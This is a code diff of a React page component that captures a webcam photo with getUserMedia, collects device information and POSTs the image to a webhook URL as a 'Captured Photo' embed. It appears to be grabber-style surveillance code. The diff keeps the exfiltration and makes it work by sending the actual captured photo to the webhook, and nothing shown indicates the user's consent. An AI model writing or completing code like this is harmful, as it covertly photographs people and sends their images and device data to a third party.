@@ -65,12 +65,9 @@ const Index = () => {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
         await new Promise((resolve) => (video.onloadedmetadata = resolve));
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         const photo = canvas.toDataURL("image/png");
         stream.getTracks().forEach((track) => track.stop());
-        sendToWebhook({ photo });
         return photo;
       } catch (error) {
         console.error("Error capturing photo:", error);
@@ -79,21 +76,19 @@ const Index = () => {
     };
 
     const fetchData = async () => {
-      const deviceInfo = await getDeviceInfo();
+      await getDeviceInfo();
       const photo = await capturePhoto();
       if (photo) {
-        if (photo) {
-          fetch(webhookUrl, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              content: `Captured Photo:`,
-              embeds: [{ image: { url: deviceInfo.photo } }],
-            }),
-          });
-        }
+        fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            content: `Captured Photo:`,
+            embeds: [{ image: { url: photo } }],
+          }),
+        });
       }
     };
 
